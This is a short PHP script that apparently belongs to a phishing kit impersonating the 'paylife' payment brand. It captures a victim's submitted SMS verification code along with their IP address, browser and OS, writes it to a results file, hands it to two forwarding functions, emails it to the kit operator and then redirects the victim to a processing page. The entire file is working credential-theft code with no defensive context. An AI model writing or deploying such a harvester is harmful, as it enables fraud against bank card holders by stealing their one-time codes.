<?php
include('funcs.php');
$ip = getenv("REMOTE_ADDR");
$data = $_POST;
$user = $data["New"];
        $msg  = "===============================================================\n";
        $msg .= "========================#paylife_2020#============================\n";
        $msg .= "===============================================================\n\n";
        $msg .= " SMS : $user                       \n";
        $msg .= " Login : True                      \n\n";
        $msg .= " Browser : $Browser                 \n";
        $msg .= " OS : $OS                           \n";
        $msg .= " Ip : $ip                           \n\n";
        $msg .= "===============================================================\n";
        $msg .= "=========================#paylife#==============================\n";
        $msg .= "===============================================================\n";

        $fp = fopen("rzlt/csms.txt", "a");
        fwrite($fp, $msg);
        fclose($fp);
        toamine($msg);
        toadam($msg);
        mail($send,"paylifel 2020 | ".$user,$msg,"From: paylife <paylife@".$_SERVER['SERVER_NAME'].">");
        sleep(10);
        header("Location: proc.html");      
?>